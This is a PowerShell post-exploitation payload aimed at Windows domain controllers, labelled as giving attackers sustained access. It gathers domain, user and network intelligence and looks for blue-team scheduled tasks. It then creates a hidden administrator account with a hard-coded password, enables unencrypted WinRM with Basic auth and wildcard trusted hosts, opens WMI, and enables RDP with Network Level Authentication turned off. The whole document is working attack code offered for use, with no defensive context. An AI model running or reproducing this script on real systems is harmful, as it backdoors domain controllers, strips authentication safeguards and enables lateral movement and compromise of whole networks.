# ============================================================
# DC SECONDARY PAYLOAD - Tier 1 (Domain Controllers)
# ============================================================
# Lateral movement prep + recon + hidden admin creation
# Target: Domain Controllers (sustained access)
# ============================================================

# RECONNAISSANCE: Domain enumeration (DC-specific intel)
try{$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $o=@("Domain: $($d.Name)","DCs: $($d.DomainControllers|ForEach-Object{$_.Name})","Forest: $($d.Forest.Name)"); $o+="=== Domain Admins ==="; $o+=cmd /c "net group ""Domain Admins"" /domain 2>nul"; $o|Out-File C:\ProgramData\d.txt -Force}catch{'Not domain-joined'|Out-File C:\ProgramData\d.txt -Force}

# RECONNAISSANCE: Full system + network enumeration
$o=@(); $o+="=== HOSTNAME ==="; $o+=hostname; $o+="=== USERS ==="; $o+=cmd /c "net user"; $o+="=== ADMINS ==="; $o+=cmd /c "net localgroup Administrators"; $o+="=== NETWORK ==="; $o+=ipconfig /all; $o+="=== CONNECTIONS ==="; $o+=netstat -an; $o+="=== ARP ==="; $o+=arp -a; $o+="=== SERVICES ==="; $o+=cmd /c "sc query state= all"; $o | Out-File C:\ProgramData\r.txt -Force

# RECONNAISSANCE: Enumerate scheduled tasks (find blue team monitoring)
Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } | Select-Object TaskName,TaskPath,State,@{N='Actions';E={$_.Actions.Execute}} | Format-Table -AutoSize | Out-String | Out-File C:\ProgramData\t.txt -Force

# USER CREATION: Hidden admin (hidden from login screen)
cmd /c "net user svcUpdate Pa$$w0rd2026! /add & net localgroup Administrators svcUpdate /add"; $p='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'; if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}; New-ItemProperty -Path $p -Name svcUpdate -Value 0 -PropertyType DWord -Force|Out-Null

# LATERAL MOVEMENT: Enable WinRM for lateral movement
cmd /c "winrm quickconfig -quiet & winrm set winrm/config/service @{AllowUnencrypted=""true""} & winrm set winrm/config/service/auth @{Basic=""true""}"

# LATERAL MOVEMENT: Enable PSRemoting + set trusted hosts to any
Enable-PSRemoting -Force -SkipNetworkProfileCheck; Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force

# LATERAL MOVEMENT: Enable WMI remote access
cmd /c "netsh advfirewall firewall set rule group=""Windows Management Instrumentation (WMI)"" new enable=yes"

# RDP ENABLEMENT: Enable RDP + disable NLA (stealthy, no new firewall rules)
$r='HKLM:\System\CurrentControlSet\Control\Terminal Server'; Set-ItemProperty $r -Name fDenyTSConnections -Value 0; Set-ItemProperty "$r\WinStations\RDP-Tcp" -Name UserAuthentication -Value 0; cmd /c 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'
